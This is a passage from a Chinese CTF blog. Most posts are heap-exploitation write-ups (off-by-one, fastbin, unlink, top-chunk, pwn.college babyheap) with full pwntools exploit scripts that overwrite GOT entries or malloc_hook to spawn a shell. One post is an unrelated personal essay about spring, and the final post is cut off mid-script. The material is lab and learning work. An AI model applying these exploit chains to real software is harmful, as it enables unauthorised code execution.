对于每个note，程序会额外分配0x10的结构，这点呈现在内存空间中，如图所示，这里我们依次add了两个0x10大小的note。对于chunk0.content从030地址处开始读入，合法情况下会读入到040前，我们尝试溢出。在没有十分清晰的思路前，我们可以先随便溢一些东西测试一下。 ​ ​ 可以看到，确实溢出了，但是并没有什么意义，因为chunk0的content chunk16位对齐了，而我们需要在last chunk的size溢出，而不是prev_size，所以chunk0的size应该是8位对齐，比如说0x18。 123add(0x18,b&#x27;a&#x27;*0x18)#chunk0add(0x10,b&#x27;a&#x27;*0x10)#chunk1edit(0,b&#x27;a&#x27;*0x18 + b&#x27;\\x41&#x27;) ​ 我们更正chunk0 size为0x18，溢出0x41。 ​ 为什么是0x41呢？我们申请的chunk1的size是0x10，加上chunk头，总共是0x20大小，并且加上chunk struct chunk的0x20，能够实现chunk overlapping的最小size就是0x40，当然还要加上inuse位的“1”。 ​ 当我们成功实现溢出，此时chunk1的structure chunk size就是0x41。但是仅仅这样我们并没有任何方法可以修改储存在chunk1 struct chunk 中的chunk ptr，因此我们需要进一步利用。 fastbin中构造chunk overlapping​ 我们释放chunk1，此时，fastbin中是这样的。 ​ 可以看出bin中发生了空间的重叠。那么这样的重叠会造成什么问题呢？假设先add0x40的chunk，那么就在040处分配，此时再add 0x20的chunk，则会在060处分配，在这道题里，0x20的chunk正好对应一个structure chunk，所以我们可以通过写一个size小于等于0x30的chunk，来更改struct chunk中的ptr。但是有一些条件需要保证，比如说0x40chunk的user space必须要在struct chunk前开始，或者正好相符，但是这个条件申请0x30的话完全可以满足。 12free(1)add(0x30,b&#x27;a&#x27;*10) 测试一下 ​ 稍微有一些怪，为什么之前的chunk1 struct chunk的内容没有被清空。 ​ 感觉出了一些我无法解释的bug，暂时先放一放吧。接着可以修改ptr为free got addr 123free(1)add(0x30,b&#x27;a&#x27;*0x18+p64(0x20)*2+p64(free_got_addr))show(1) 然后打印chunk1。 这里被搞了，一直没有办法搞到干净的free addr，只能跑去学习先进的py知识。 我用的是 12r.recvuntil(&quot;Content : &quot;)free_addr = u64(r.recv()[0:8])#0x7ffff7ab1c50 先进的py知识是： 123r.recvuntil(&quot;Content : &quot;)data = r.recvuntil(&quot;Done !&quot;)free_addr = u64(data.split(&quot;\\n&quot;)[0].ljust(8, &quot;\\x00&quot;)) 修改free got为system​ 先是常规拿system地址。然后需要修改free got为system，而观察程序，chunk structure chunk中的ptr指向的是chunk content，我们已经将这个ptr改成了一个指向free got的指针，所以只需要修改对应的chunk content，就相当于修改了free got。 ​ 所以接下来，我们只需要修改chunk1的content为system addr，同时为了getshell，我们需要free一个content为binsh字符串的chunk，这时候我们可以再add一个chunk，也可以将chunk0的content更改成binsh字符串，然后free chunk0。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;r = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./heapcreator&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc-2.23.so&quot;&#125;)elf = ELF(&#x27;./heapcreator&#x27;)free_got_addr = elf.got[&#x27;free&#x27;]def add(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def edit(idx, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(content)def show(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def free(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))add(0x18,b&#x27;a&#x27;*0x18)#chunk0add(0x10,b&#x27;a&#x27;*0x10)#chunk1edit(0,b&#x27;a&#x27;*0x18 + b&#x27;\\x41&#x27;)free(1)add(0x30,b&#x27;a&#x27;*0x18+p64(0x20)*2+p64(free_got_addr))show(1)r.recvuntil(&quot;Content: &quot;)data = r.recvuntil(&quot;Done !&quot;)free_addr = u64(data.split(b&quot;\\n&quot;)[0].ljust(8, b&quot;\\x00&quot;))system_addr = free_addr - (libc.symbols[&#x27;free&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))edit(1,p64(system_addr))add(0x30,b&quot;/bin/sh;&quot;)#chunk2free(2)r.interactive() 感想：​ 为什么这样一道题也要写感想捏？主要是因为之前学习的时候花了很多时间，并且感觉十分困难，但是今天再来看一看，感觉这个题在同类型中尤其简单，并且在笔记中发现了很多很无语的错误。我并不是为觉得自己进步多大而感到兴奋，而是为半年前我自己的菜感到不可思议，我真的无法理解，但是过去无法改变，也没必要怨天尤人。 例2：overview​ ctf-wiki上的例子，之前一直没有做，正好拿来复习offbyone。 首先肯定不能改got了。canary没开也比较灵性，不过开不开都差不多其实。 re​ 菜单，每个book的结构其实相对来说并不复杂。book 结构体的分配如下： 123456*((_DWORD *)book_ptr + 6) = size;*((_QWORD *)head + v2) = book_ptr;*((_QWORD *)book_ptr + 2) = des_ptr;*((_QWORD *)book_ptr + 1) = name_ptr;*(_DWORD *)book_ptr = ++unk_202024;//idreturn 0LL; 申请一个name和des都是0x10大小的book，内存空间如下： 12345678910111213141516int i; // [rsp+14h] [rbp-Ch]if ( a2 &lt;= 0 ) return 0LL;for ( i = 0; ; ++i )&#123; if ( (unsigned int)read(0, a1, 1uLL) != 1 ) return 1LL; if ( *a1 == &#x27;\\n&#x27; ) break; ++a1; if ( i == a2 ) break;&#125;*a1 = 0;return 0LL; ​ 漏洞出在这个读入的函数，在读取应该结束的时候，buf却不正确地加一，同时指向区域被置0，这就造成了空字节溢出。这个读入函数虽然被用于每一个和输入有关的功能上，但是只有输入作者姓名的时候可以较为方便地利用。 利用大致的思考​ 这道题的核心就在于溢出空字节，修改next chunk的prev inuse位，造成chunk overlapping。相较于之前那个比较简单的例子，这个例子在程序逻辑上相对更复杂，并且漏洞的利用难度增加了一些，首先就是不能溢出任意的单字节，这就为我们修改chunk size增加了步骤。 leak heap​ 这里有个非常之坑的点。我们输入的作者姓名和book结构体地址正好相差32字节，所以按道理我们输入在作者姓名时输入32个字符，字符串末尾的空字节会在创建结构体时被直接覆盖为结构体的指针，因此打印book信息的时候，作者这一栏能直接把后面的指针也打印出来。 ​ 但是，如果我们是使用pre_load加载别的版本的libc，那么，这里作者名字的地址和结构体的地址，就完全不在一个地方，根本没有办法泄露。所以在这里我们只能先摁把libc改成本机，或者找个16.04的ubuntu来做，改本机libc这种事情不是linux铁佬建议别尝试，上一个被我魔改的ubuntu已经与这个世界说再见了。 ​ 摁打情况的exp如下： 12345678io.recvuntil(&quot;Enter author name: &quot;)io.sendline(b&quot;a&quot;*32)add(32,b&#x27;a&#x27;,32,b&#x27;a&#x27;)printbook(1)io.recvuntil(b&#x27;Author:&#x27;)heap_addr = io.recv()[32:38]heap_addr = u64(heap_addr.ljust(8,b&#x27;\\x00&#x27;))log.success(&quot;heap_addr&quot; + hex(heap_addr)) 利用fake chunk构造任意地址写​ 我们已经获得了一个堆上的地址，接下来我们需要利用空字节溢出构造出任意地址写。还是利用到刚才利用过的漏洞点，再次在修改作者名字时写入32个字符，这样空字节就会溢出覆盖struct chunk ptr中第一个 chunk ptr的地址最低位。 ​ 因为每个book，des和name相对structure是在低地址，所以当structure的ptr最低位被空字节覆盖，如果此时des chunk很大的话，那么structure就会指向des chunk的内部。 ​ 这样chunk structure的指针已经被我们劫持了，des中也有足够的空间，我们现在只需要伪造出一个合法可利用的fake structure。在这个假的结构中，我们需要实现任意地址写的功能。我们可以在fake book1 structure的des ptr字段填写book2 des ptr字段的地址，当我们使用edit修改book1的字段时，实际上就是对book2 des ptr进行修改。我们可以将其修改为我们想要的任何地址，比如free_got，于是当我们edit book2的des时，就是对这个des ptr指向的地方，也就是我们刚刚修改的地址指向的地方进行修改，比如说改为system_addr。这就是一个很完美的任意地址任意写的实现。 leak libc​ 为了完成任意地址写，我们还需要获得system的地址。这个题同样可以通过mmap()暴力拿到libc的基址。 细节以及exp累了，tbc。 ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​","categories":[{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"春日和","slug":"幻想曲-01-春天","date":"2022-04-02T16:00:00.000Z","updated":"2022-04-13T03:29:17.988Z","comments":true,"path":"2022/04/03/幻想曲-01-春天/","link":"","permalink":"https://fuurinko.github.io/2022/04/03/%E5%B9%BB%E6%83%B3%E6%9B%B2-01-%E6%98%A5%E5%A4%A9/","excerpt":"","text":"​ ​ 一系列的事情最终使我感觉，春天确实已经到了。 ​ 首先是刷牙时无意发现的丢在洗衣机旁阴暗角落的，去年秋天栽下去的铃兰花长出的鲜嫩的叶片。那时候和小戴怀着赌一把的心理，一起将一些看起来黄不拉几的铃兰根系一颗一颗地埋在土里，还非常认真地每隔几天就浇水，但是泛着土色的幼芽接连几个月都毫无起色，有时候甚至看起来像发霉了一般，于是后几个月我和小戴谁也没有管它——我们俩一致认为它已经死了。 ​ ​ 但是似乎，它真的在一夜之间，从一位濒死的垂鬓长成了生机勃勃的少年人。叶片是充满生命活力的鲜绿色，又或者说是我最近很喜欢穿的荧光绿衣服的颜色，叶片笔直而坚挺，倒像是一颗年轻的大葱，希望它也能像大葱那样好养活吧。 ​ 我被这样突如其来的惊喜给感动了，于是逐渐开始回忆，春天到来时，我身边美好生命的点点滴滴。最显而易见的美，一定是上周开满学校的樱花树。 ​ 学校种的是中国樱花，花开起来大约有三分之二个小姑娘的手那么大，花瓣重重叠叠，粉粉嫩嫩的，单看还是娇艳欲滴，让人心生向往的，但是远看整片樱花树林，我倒觉得没有日本种的樱花看起来那么盛大了，学校种这些樱花的思路，大概和日本街头的完全不一样吧。学校里的樱花，相比树木，倒更起了“灌木”的作用，树枝纤弱着，似乎更加易于运输和移栽，时间成本也会更低。有机会可以去武大看看，那边的樱花似乎是日本樱花，应该会很好看。 ​ 这一周接连下了五六天的雨，到今天早上看的时候，寝室楼下的樱花树已经完全没有了盛开过的痕迹，那些粉色的落花被雨水完全清扫干净了，取而代之的，是春夏天交接的清冽气息。借用之前在网上看到的话，讲的大概是“用‘春天结束了’来代指夏天的到来，本身就很浪漫”，不过这里春天才刚刚开始，笑。 ​ 雨水也是春日美好的主角之一。我喜欢看树色被雨水冲洗过后闪闪发光的新绿，饱和度极高的鲜艳色彩与大理石地面上的积雨融在一起，颇有“水树一色”的意味，这时候通常又是在早八的稍后一些，路上没有什么人，耳朵里只有雨水滴答在胶皮伞面上清晰而响声，这是怎样先进音响效果也无法比拟的。虽然下雨会湿鞋，这点有些令人恼火。 ​ 雨停的时候，鸟鸣代替了雨声，稀疏而悦耳的鸟鸣，混杂着树林制造的自然背景音，又是一种奇妙的体验。如果平时走在路上感受不到，不妨用手机记录下来，在安静的地方听一听，确实有奇效。（杜比全景音真的很强） ​ 但是春天真的很短，似乎下周开始就要进入夏天了，不过话说回来，夏天我也是很喜欢的。 ​ ​ ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"fastbin中uaf实现任意地址分配的检测问题","slug":"heap_fastbin中uaf实现任意地址分配的检测问题","date":"2022-04-02T00:37:40.817Z","updated":"2022-04-09T08:38:54.979Z","comments":true,"path":"2022/04/02/heap_fastbin中uaf实现任意地址分配的检测问题/","link":"","permalink":"https://fuurinko.github.io/2022/04/02/heap_fastbin%E4%B8%ADuaf%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E6%A3%80%E6%B5%8B%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 目前做到的与fastbin有关（包括Tcache），并且存在uaf漏洞，需要通过任意地址分配来实现利用的题大致有两类，一类对于申请的chunk，通过简单或者复杂的结构体管理，在一个note的结构体中通常包括size，content甚至指针等字段，我们可以通过覆盖指针实现任意地址分配。另一类则是相对逻辑比较简单的，并没有为note定义结构体，仅仅使用了类似数组的形式，这样的话覆盖free chunk的fd就比较直观并且简单。 ​ 但是无论哪种题目，当我们已经修改free chunk的fd，想要在指定地址分配chunk的时候，必须满足一些检测，或者说条件，不然就会有奇怪的报错，比如： ​ 这里地址是随便找的栈地址，图一乐图一乐。 ​ 既然是任意地址分配，按道理只要是可写的地址应该都能成功。这里直接研究如何将chunk分配至malloc_hook，也是使用场景较多的一种。 ​ 其实绕过的核心还是在于，目标地址的chunk头域是否存在合法的size。 ​ 比如说ctf-wiki上的Arbitrary Alloc一例，就是寻找malloc hook地址附近是否有符合fastbin大小范围的，可以用做size域的字节。如果有，则找到对应的偏移，申请target addr - offset处的地址就行。 ​ 举例，题目是ciscn2019的double。 ​ 前面的利用可以直接不管，现在我们需要在 malloc_hook处构造fake chunk。 ​ 查看malloc_hook附近的数据，发现0x7ffff7dd4af0地址附近的\\x7f数据是很适合作为size的，其所在的具体地址为0x7ffff7dd4af5，所以chunk头地址应该为0x7ffff7dd4af5-0x8，0x7ffff7dd4aed，与malloc_hook偏移为0x23。所以我们需要在fastbin fd为覆盖上malloc_hook- 0x23。 ​ ​ 也就是说，核心思路是构造chunk头的size域，无论是地址附近本身就有这样符合要求的字节，或者是通过输入等人为构造都是可以的。而且只要满足了这个条件，就基本能实现任意地址分配。 ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"NoLeak","slug":"week6-3.1","date":"2022-04-01T13:34:22.000Z","updated":"2022-04-09T00:54:51.476Z","comments":true,"path":"2022/04/01/week6-3.1/","link":"","permalink":"https://fuurinko.github.io/2022/04/01/week6-3.1/","excerpt":"","text":"overview ​ 非常之畸形。 re​ 逻辑比较简单，结构体中只有一个chunk bp的字段。漏洞点也很魔幻，free只free结构体中保存的指针，而没有free malloc出来的ptr本身，并且没有置0，顺便edit的时候size没有限定，可以造成堆溢出。 ​ 并且题目并没有可控的输出功能,虽然调用了write()，但是我们很难通过改got表来调用。 利用​ 没有办法改got表，但是可以写shellcode。所以是不是能控制指针，add到栈上写shellcode呢？ ​ 但是问题随即而来，我们有向栈上写shellcode的能力，但是如何控制程序执行？ ​ 由于没有leak的机会，所以我们很难通过单纯向栈内写东西来使得shellcode执行，所以需要借用其他的函数，比如说将让malloc_hook指向shellcode_addr，这样就能执行了。（这一点是比较常见的思路，做过类似的题就能记住） ​ 但是第一步，我们需要一个任意地址写，来将shellcode写入。 关于任意地址分配的疑思​ 最开始还是因为没有看清楚，就以为这是一道fastbin double free，但这个题目前来说并没有办法找到比较简单好用的leak方式，并且后续的利用需要leak unsortedbin，这显然就不是fastbin的范围。（不过这里佬们看到uaf+edit堆溢出估计一眼unlink了吧） ​ 虽然但是还是尝试了一下无脑改fd，但是无情的报错掐碎了我的幻想，之所以报错大概是我忘写chunk的size域，导致过不了检测。 ​ 到这里就不再探讨fastbin attack了，一般来说在UAF的情况下构造非fastbin的任意地址写，也就剩unlink比较简单好用。 大体思路​ 先通过unlink，劫持chunk结构体，或者说buf中保存的指针，使其指向malloc_hook，再写shellcode，并修改malloc_hook为shellcode地址。 unlink构造任意地址写​ 需要使得unsortedbin的fd指向malloc_hook，就需要修改fd最低位为\\x10。这一点可以参考unsorted leak的一些知识点，因为malloc_hook和main_arena存在大小为0x10的固定偏移，而unsortedbin 链表的尾部bin的fd又是指向main_arena的某处的，所以一般来说只要修改这个fd为0x10就行。 ​ 所以我们需要构造一个任意地址写来修改unsorted bin的fd。 ​ pps：由于我是废物，对于unlink还不是很熟练，所以需要花一些篇章来描述unlink的构造。 ​ 草了。我突然意识到unlink构造是可以背板的，无非就是让写fake bk到fake fd指向的地方，然后劫持fake fd对应的指针。 12345678910111213141516add(0x20,b&#x27;a&#x27;)#idx0add(0x100,b&#x27;a&#x27;)#idx1add(0x100,b&#x27;a&#x27;)#idx2add(0x20,b&#x27;a&#x27;)#idx3payload = b&#x27;a&#x27;*0x20 #paddingpayload += p64(0) + p64(0x111) #prev_size,size,payload += p64(0) + p64(0x21)payload += p64(head + 8 - 0x18) #fake chunk fdpayload += p64(head + 8 - 0x10) #fake chunk bkpayload += p64(0x20) # next chunk&#x27;s prev_size to bypass the checkpayload = payload.ljust(0x110, b&#x27;a&#x27;)# paddingpayload += p64(0x100)# Next_chunk&#x27;s prev_size field. Make it believe that prev chunk is freepayload += p64(0x110)# Next_chunk&#x27;s size fieldedit(0,len(payload),payload)free(2) ​ 难绷。 劫持ptr为shellcode地址​ 这样我们就劫持了idx1的指针，我们edit chunk的时候实际就是在修改指针使其指向任意地址。（这样看来其实这个部分和wiki上的unlink例题有点像。 123456payload = b&#x27;a&#x27;*16payload += p64(shellcode_addr)#chunk[0] to shellcode_addrpayload += p64(head + 6 * 8)#chunk[1] to chunk[5]payload += p64(0)#chunk[2]payload += p64(0)#chunk[3]edit(1,len(payload),payload) 这样当我们再次编辑chunk0，就是在shellcode addr上写入数据了。 1edit(0,len(shellcode),shellcode) 劫持main_arena为malloc hook​ 光写入shellcode不够，我们还需要将malloc_hook的值改为shellcode_addr。 ​ 所以我们需要改main_arena为malloc hook，具体原因以及方法之前已经分析过了。在前面的payload中，我们将chunk1的ptr修改为了chunk5的ptr，也就是链表尾部bin的地址，这个尾部bin的fd正好就是指向main_arena的，这样我们就能够单个字节覆盖fd，使其指向malloc hook。最后，我们直接再次edit这个chunk，让它的内容为shellcode地址即可。 12edit(1,1,b&#x27;\\x10&#x27;)edit(6,8,p64(shellcode_addr)) ​ 下次一定。蚌埠住了。 ​ ​ ​ ​ ​","categories":[{"name":"HEAP - Unlink","slug":"HEAP-Unlink","permalink":"https://fuurinko.github.io/categories/HEAP-Unlink/"}],"tags":[{"name":"Chunk Overlapping","slug":"Chunk-Overlapping","permalink":"https://fuurinko.github.io/tags/Chunk-Overlapping/"}]},{"title":"Dynamic_Allocator_Misuse","slug":"pwn.college_Dynamic_Allocator_Misuse","date":"2022-04-01T12:34:14.000Z","updated":"2022-05-23T09:25:25.374Z","comments":true,"path":"2022/04/01/pwn.college_Dynamic_Allocator_Misuse/","link":"","permalink":"https://fuurinko.github.io/2022/04/01/pwn.college_Dynamic_Allocator_Misuse/","excerpt":"","text":"Level1​ ​ 开门绿，你从未拥有过的全新体验（ ​ 给出了增删查以及load flag的四个功能，free有uaf，纯纯的uaf啊。 ​ 直接malloc flag_chunk_size，free，然后load flag，flag chunk被load在chunk0内存空间，然后puts就行。 Level1.1​ 故技重施。 Level2.0​ 做法和楼上完全一致，但是程序逻辑其实是不一样的，详见level2.1。 Level2.1​ level2和1的差别就是load flag并不是使用固定的size，而是随机数，在2.0我们可以看到flag chunk的size，但是2.1不行，所以需要想办法绕过。 ​ ​ 一个128 ～ 999的随机数。 ​ 所以绕过的思路也非常之简单，只需要malloc的chunk size大于999+0x8就行。我随便malloc了1200，亲测有效。 ​ Level3.0连续malloc 两个832sizechunk，然后依次free chunk1 和chunk0。再read flag，puts chunk1。 Level3.1​ 一样。 Level4.0​ （这个不会是level3的随机数版吧。。。。 还好，不是） ​ 我才意识到它那个read two times其实会覆盖第一次read的内容，所以puts的话是要write 第二次read的flag。 ​ 回到题本身，多出一个scanf的功能，应该是希望我们修改fd。话说这个是真的不走寻常路，一上来就整tcache。但是也能理解，tcache和fastbin在这种等级上的利用难度其实差不多。 ​ 程序依旧是可以uaf，malloc flag chunk size，free掉，然后edit fd，使其指向flag chunk，下一次malloc就会分配flag chunk的空间。也就是能够将flag puts出来，但是有个问题就是，如果直接输入fd的覆盖的话似乎是没有办法转换成字节流的，我又懒得写脚本，怎么搞呢。能跳过这道题吗。 ​ 能*v* Level5.0​ 感觉前面的level没啥好做的。 ​ 可以add 最多16个chunk，多了一个puts_flag功能，大致就是只要flag ptr指向的地方不为0就能打印flag。但是程序并没有给我们提供覆盖内存的功能。 123456789101112131415161718for ( i = 0; i &lt;= 0; ++i ) &#123; printf(&quot;[*] flag_buffer = malloc(%d)\\n&quot;, 432LL); size_4 = (const char *)malloc(0x1B0uLL); *(_QWORD *)size_4 = 0LL; printf(&quot;[*] flag_buffer = %p\\n&quot;, size_4); &#125; v3 = open(&quot;/flag&quot;, 0); read(v3, (void *)(size_4 + 16), 0x80uLL); puts(&quot;[*] read the flag!&quot;); &#125; if ( strcmp(s1, &quot;puts_flag&quot;) ) break; if ( *(_QWORD *)size_4 ) puts(size_4 + 16); else puts(&quot;Not authorized!&quot;); &#125; ​ flag 是在flag ptr + 16 的地方读入的，但是需要让flag_ptr +不为0， 并没有任何输入的方法的话，只能通过构造chunk的meta datd了。不过其实我不理解，flag已经被load进了idx0，为什么puts出来是空字节…大概是因为flag是在ptr+16的地方读入，前面的字符都是\\x00，所以还是需要覆盖flag ptr首字节为自然数，然后通过puts_flag拿flag。 ​ 但是这个思路感觉行不通，因为每次load flag之后都会把ptr首字节置0，所以有了另外一种思路就是在ptr+16的地方伪造idx。也就是需要使一个idx指向ptr+16。 Level6​ 输入的flag与0x42554b处八个字符相等即可拿flag，但是这个地址处的字符显然需要我们自己覆盖。所以思路是利用uaf构造任意地址写。但是又有scanf。这下不得不写脚本了。 蚌埠住了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import*p = process(&quot;/challenge/babyheap_level6.0&quot;)#p = process(&quot;./babyheap_level6.0&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;target_addr = 0x42554B - 0x10def add(idx,size): p.recvuntil(&quot;:&quot;) p.sendline(b&quot;malloc&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def free(idx): p.recvuntil(&quot;:&quot;) p.sendline(&quot;free&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def puts(): p.recvuntil(&quot;:&quot;) p.sendline(&quot;puts&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def edit(idx,content): p.recvuntil(&quot;:&quot;) p.sendline(&quot;scanf&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;\\n&quot;) p.sendline(content)add(0,40)#chunk0free(0)#bin0payload = p64(target_addr)*2edit(0,payload)gdb.attach(p)add(0,40)#point to target_addredit(0,b&#x27;a&#x27;*40)add(1,40)#point to target_addredit(1,b&#x27;a&#x27;*40)p.recvuntil(&quot;:&quot;)p.sendline(b&quot;send_flag&quot;)p.recvuntil(&quot;Secret: &quot;)p.sendline(b&quot;a&quot;*8)p.interactive() Level7​ level6的随机数版，建议别做，折寿。 Level8​ fd的target addt开头是换行符，但是无所谓，直接申请0x426701-0x10就行，下一道。 Level9 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"starctf_2019_quicksort","slug":"week5-4.1","date":"2022-03-31T12:04:14.000Z","updated":"2022-04-06T12:20:20.285Z","comments":true,"path":"2022/03/31/week5-4.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/31/week5-4.1/","excerpt":"","text":"overview​ libc大版本是2.23。 re​ 整体实现了一个简单的快速排序功能，在输入具体需要排序的数的时候存在溢出，但是由于开启了canary，并不是很好利用。并且num的储存其实是在堆上的，所以我以为这是个栈题，这其实是个堆题。 12345678910111213141516171819memset(s, 0, sizeof(s)); num = 0; puts(&quot;how many numbers do you want to sort?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;num); getchar(); num_ptr = malloc(4 * num);//add num_chunk for ( i = 0; i &lt; num; ++i ) &#123; printf(&quot;the %dth number:&quot;, i + 1); gets(s);// v0 = (int *)((char *)num_ptr + 4 * i); *v0 = atoi(s);//将输入的num储存在num_chunk中 &#125; sorting(num_ptr, 0, num - 1);//不想看有没有洞的排序 puts(&quot;Here is the result:&quot;); for ( j = 0; j &lt; num; ++j ) printf(&quot;%d &quot;, *((_DWORD *)num_ptr + j));//输出结果 puts(&amp;byte_8048AD2);//看不懂有啥用。 free(num_ptr);//意义不大 ​ 随便输点东西，堆上布局是这样。 ​ 可以看到这个gets还是起了大用处的。 ​ 研究了一下，发现这里目前最大的漏洞在于储存输入num个数的变量和控制num chunk的ptr是相邻的，所以可以通过gets 将ptr覆盖成任意数,这样在输入num的时候就能够实现任意地址写。 （之前看瞎眼了，还以为覆盖的只是num的size在栈上的值，以为要通过num的idx来任意地址写，太恐怖了） 利用 需要至少两次malloc，以在print后继续输入payload。因为在这个阶段我们并没有leak任何的真实地址，所以考虑覆盖某个got为main addr。 在leak libc后，假定能够再次输入，需要选择合适的函数来覆盖为system，条件是参数可控。（这里似乎只有free是可能的） ​ 所以第一次执行时，申请两个num，输入第一个num时覆盖num ptr为free got addr，并在payload前四位填写free got addr，输入第二个num时，此时num ptr已经为free got addr，填写main addr覆盖，接着printf leak libc，call main，进行第二次num chunk的申请，同样地将free got 覆盖为system addr。并再次覆盖num ptr为某个可写的地址，输入binsh字符串从而getshell。 ​ 好麻。 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;elf = ELF(&#x27;././starctf_2019_quicksort&#x27;)p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./starctf_2019_quicksort&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)puts_got_addr = elf.got[&#x27;puts&#x27;]free_got_addr = elf.got[&#x27;free&#x27;]gets_got_addr = elf.got[&#x27;gets&#x27;]main_addr = 0x8048816addr = 0x804b000p.recvuntil(&quot;how many numbers do you want to sort?&quot;)p.sendline(b&quot;2&quot;)payload = p32(free_got_addr).ljust(16,b&#x27;a&#x27;)+ p32(2) + p32(1)*2 + p32(free_got_addr)p.recvuntil(&quot;the 1th number:&quot;)#idx 1p.sendline(payload)#overwrite num_ptr with free got addrp.recvuntil(&quot;the 2th number:&quot;)#idx 2p.sendline(p32(main_addr))#modify free_got to main addrp.recvuntil(&quot;Here is the result:&quot;)puts_addr = u32(p.recvuntil(&quot;1&quot;)[:4])#leak libc addrlog.success(&quot;free_addr =&gt; &#123;&#125;&quot;.format(hex(free_addr)))system_addr = free_addr - (libc.symbols[&#x27;free&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))p.recvuntil(&quot;how many numbers do you want to sort?&quot;)#ret to main againp.sendline(b&quot;2&quot;)#allocate chunk in free got addrpayload = p32(system_addr).ljust(16,b&#x27;a&#x27;)+ p32(2) + p32(1)*2 +p32(addr)#overwrite freegot with systemp.recvuntil(&quot;the 1th number:&quot;)p.sendline(payload)p.recvuntil(&quot;the 2th number:&quot;)p.sendline(b&quot;/bin/sh;&quot;)p.interactive() ​ ​ ​ ​","categories":[{"name":"HEAP - Heap overflow","slug":"HEAP-Heap-overflow","permalink":"https://fuurinko.github.io/categories/HEAP-Heap-overflow/"}],"tags":[]},{"title":"gyctf_2020_force","slug":"week5-3.1","date":"2022-03-30T03:21:26.675Z","updated":"2022-04-13T12:44:23.099Z","comments":true,"path":"2022/03/30/week5-3.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/30/week5-3.1/","excerpt":"","text":"overview 好绿。 逆向​ 程序比较简约，只有add和put两个功能。逻辑也不复杂。漏洞的话也比较明显，一个是程序直接把heap base白给了。另一个是虽然询问了size的大小，但是在实际add的时候完全没有根据size分配chunk,并且可以分配很大size的chunk。 ​ ​ 导致我们可以很轻易地修改top chunk的size。 ​ 并且put功能看起来只能打印D93上的东西,也就是一个空字节。 利用修改top chunk size1p.sendafter(&quot;content&quot;,b&#x27;a&#x27;*0x10 + p64(0xffffffffffffffff)*2) ​ 但是随之而来的问题就是，除了程序白给的chunk ptr以外，没有任何输出函数，以至于无法leak libc。所以只能从这个免费打印的ptr下手。 ​ 一个trick就是，我们可以add一个巨大的chunk，巨大到需要mmap来分配空间，而mmap分配的内存空间与libc是有固定的偏移的，我们能够轻易地拿到mmap分配的chunk的地址，也就能计算出libc base。 ​ 这里我随意申请了100000000000 size的chunk。 ​ ​ 可以看到，比如我们获得了addr为0x7fe8af273000，那么这个地址与libc基址的偏移就是0x76F000。 ​ 这样就能够leak libc，计算malloc hook的地址了。 123456789#leak libc with mmapp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;size&quot;)p.sendline(&#x27;100000000000&#x27;)chunk_addr = u64(p.recvuntil(&quot;bin addr &quot;)[:8])libc_base = chunk_addr + 